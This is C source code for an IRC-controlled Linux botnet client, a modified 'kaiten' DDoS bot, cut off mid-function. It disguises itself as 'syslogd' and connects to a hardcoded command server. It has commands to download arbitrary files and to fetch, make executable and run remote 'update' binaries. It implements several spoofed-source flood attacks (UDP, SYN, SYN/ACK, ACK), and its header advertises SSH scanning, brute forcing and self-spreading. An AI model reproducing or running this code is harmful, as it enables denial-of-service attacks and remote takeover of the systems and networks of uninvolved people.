/*
        Orginal ktx.c Modded by BoSSaLiNiE with SSHScan + Brute + Spread
	This source attacks are almost completly rewrited by Dr.Simone Luchetta
	(Helel Ben-Shachar, The Shining One, Son of the Dawn!)
	I've implemented some new attacks with correct offset, checksum,
	sequences and acknowledgement's number (NOW WITH NO-SPOOF).
	There are presents: ackflood, the infamous nsackflood, an improved
	version of synflood and others (like randomflood).
	Please edit INADDR_ANY part for a correct packet sending.
	Dr. Simone Luchetta, <simoneluchetta at gmail.com>
	MSN: <simoneluchetta at gmail.com>
*/



 #undef IDENT // Only enable this if you absolutely have to
 #define FAKENAME "syslogd" // What you want this to hide as
 #define CHAN "#nix"         // Channel to join
 #define KEY "777"   // The key of the channel
 #define VERSION "3.0s"          // dfnctsc-kaiten release version
 #define PORT 8782               // Port of server(s)
 #define THREADS 50             // Set Scan Threads
 #define FILENAME ".hax"
 #define DESTDIR ".hax"
 #define EXECUTION "chmod +x .syslogd && ./.syslogd &" //after spread
 int numservers=1; // Must change this to equal number of servers down there
 char *servers[] = { // List the servers in that format, always end in (void*)0
         "the.bignut.biz",
         (void*)0
 };
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <libssh/sftp.h>
#include <libssh/libssh.h>

 int sock,changeservers=0;
 char *server, *chan, *key, *nick, *ident, *user,disabled=0, execfile[256],dispass[256];
int *pids; //experiment ripped by apache-worm.c mumu
 unsigned long spoofs=0, spoofsm=0, numpids=0, running=0 ,childs=0,sek=0;


int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
 }
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
 unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
 void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	char a,b,c,d,e,f,g,h,i;
	char *vAlpha;
	int len=20;
	tmp=(char*)malloc(len+1);
	memset(tmp,0,len+1);
	vAlpha = "1234567890";
	a = vAlpha[rand() % 10];
	b = vAlpha[rand() % 10];
	c = vAlpha[rand() % 10];
	d = vAlpha[rand() % 10];
	e = vAlpha[rand() % 10];
	f = vAlpha[rand() % 10];
	g = vAlpha[rand() % 10];
	h = vAlpha[rand() % 10];
	i = vAlpha[rand() % 10];
	if (getuid() != 0){
		sprintf(tmp,"SCAN|unk|%c%c%c%c%c%c%c%c%c",a,b,c,d,e,f,g,h,i);
		} else {
		sprintf(tmp,"SCAN|root|%c%c%c%c%c%c%c%c%c",a,b,c,d,e,f,g,h,i);
		}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :GET <host> <save as>\n",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
                exit(0);
        }
        if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
                exit(0);
        }

        Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock,"NOTICE %s :Receiving file.\n",sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,"NOTICE %s :Saved as %s\n",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}

void disable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :DISABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (disabled) {
		Send(sock,"NOTICE %s :Already disabled.\n",sender);
		return;
	}
	if (strlen(argv[1]) > 254) {

                Send(sock,"NOTICE %s :Password too long! > 254\n",sender);
                return;
	}
        disabled=1;
	memset(dispass,0,256);
	strcpy(dispass,argv[1]);
	Send(sock,"NOTICE %s :Disable sucessful.\n");
}
void enable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :ENABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (!disabled) {
		Send(sock,"NOTICE %s :Already enabled.\n",sender);
		return;
	}
	if (strcasecmp(dispass,argv[1])) {
		Send(sock,"NOTICE %s :Wrong password\n",sender);
		return;
	}
        disabled=0;
	Send(sock,"NOTICE %s :Password correct.\n",sender);
}
void update(int sock, char *sender, int argc, char **argv) {
	int sock2,i,d;
	struct sockaddr_in server;
	unsigned long ipaddr;
	unsigned char dgcc;
	char buf[1024], *file;
	FILE *gcc;
	int parent=getpid();
	if (fork() != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :UPDATE <host> <bin>\n",sender);
		exit(0);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n",sender);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(80);
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
		exit(0);
	}

	gcc=popen("gcc --help","r");
	if (gcc != NULL) {
		memset(buf,0,1024);
		fgets(buf,1024,gcc);
		if (!strstr(buf,"Usage")) dgcc=0;
		else dgcc=1;
		pclose(gcc);
	} else dgcc=0;

	for (i=0;i<strlen(argv[2]) && argv[2][i] != ':';i++);
	argv[2][i]=0;
	if (dgcc) file=argv[2];
	else file=argv[2]+i+1;
	Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",file,argv[1]);
	Send(sock,"NOTICE %s :Receiving update.\n",sender);
	sprintf(buf,"rm /%s",FILENAME);

	if (dgcc) {
		FILE *file=fopen("file","wb");
		char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done;
			}
		}
		done:
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"cp file %s && rm file && chmod 777 %s && pkill %s && ./%s",argv[2],argv[2],FILENAME,argv[2]);
	}
	else {
		FILE *file=fopen("file","wb");
		unsigned char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done2;
			}
		}
		done2:
		while(1) {
			int i,d;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"cp file %s && rm file && chmod 777 %s && pkill %s && ./%s",argv[2],argv[2],FILENAME,argv[2]);
	}
	close(sock);
	close(sock2);
	system(buf);
	kill(9,0);
	exit(0);
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,".0");
        uip=inet_network(ip);
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
struct iphdr {
        unsigned int ihl:4, version:4;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
};
struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};
struct tcphdr {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}

void udp(int sock, char *sender, int argc, char **argv) {
        unsigned int port,i=0;
        unsigned long psize,target,secs;
        struct sockaddr_in s_in;
        struct iphdr *ip;
	struct udphdr *udp;
	char buf[1500],*str;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if (argc < 3) {
                Send(sock,"NOTICE %s :UDP <target> <port> <secs>\n",sender);
                exit(1);
        }
        target = host2ip(sender,argv[1]);
        port = atoi(argv[2]);
        secs = atol(argv[3]);
        ip=(void*)buf;
	udp=(void*)(buf+sizeof(struct iphdr));
        str=(void*)(buf+sizeof(struct iphdr)+sizeof(struct udphdr));
        memset(str,10,1500-(sizeof(struct iphdr)+sizeof(struct udphdr)));
        Send(sock,"NOTICE %s :Packeting %s.\n",sender,argv[1]);
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = 1500;
        ip->frag_off = 0;
        ip->protocol = 17;
        ip->ttl = 64;
        ip->daddr = target;
        udp->len = htons(psize);
        s_in.sin_family  = AF_INET;
        s_in.sin_addr.s_addr = target;
        for (;;) {
                udp->source = rand();
                if (port) udp->dest = htons(port);
                else udp->dest = rand();
                udp->check = in_cksum((u_short *)buf,1500);
                ip->saddr = getspoof();
                ip->id = rand();
                ip->check = in_cksum((u_short *)buf,1500);
                s_in.sin_port = udp->dest;
                sendto(get,buf,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
                if (i >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        i=0;
                }
                i++;
        }
}

void synflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :SYNFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Flooding with TCP SYN %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}


void nssynflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :NSSYNFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Flooding with TCP SYN %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void randomflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :RANDOMFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP SYN/ACK %s.\n",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;

        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}




void ackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :ACKFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
	dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP ACK %s.\n",sender,argv[1]);

	send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 255;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
	send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
	send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
		saddr=getspoof();
		if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}

void nsackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :NSACKFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP ACK %s.\n",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
